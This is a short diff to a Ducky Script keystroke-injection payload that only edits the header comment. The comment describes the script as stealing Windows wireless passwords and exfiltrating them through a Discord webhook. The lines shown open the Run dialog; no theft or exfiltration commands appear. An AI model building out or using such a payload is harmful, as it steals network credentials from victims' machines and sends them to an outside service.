@@ -1,4 +1,4 @@
-REM Ducky Script for Stealing Windows Wireless Passwords and exfiltrating through Discord webhook.
+REM Ducky Script (Bruce) for Stealing Windows Wireless Passwords and exfiltrating through Discord webhook.
 DELAY 500
 GUI r
 DELAY 300
